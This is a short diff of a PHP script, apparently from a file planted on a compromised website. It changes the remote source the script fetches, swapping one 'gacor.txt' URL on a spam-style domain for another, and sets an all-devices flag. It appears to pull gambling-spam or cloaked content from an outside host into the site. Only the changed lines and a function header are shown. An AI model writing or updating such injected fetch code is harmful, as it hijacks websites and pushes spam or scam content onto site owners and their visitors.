@@ -1,6 +1,6 @@
 <?php
 
-$contents = 'https://amp-seotobrut.xyz/gacor.txt';
+$contents = 'https://stockity.fun/gacor.txt';
 $allDevice = true;
 
 function getContents($url) {
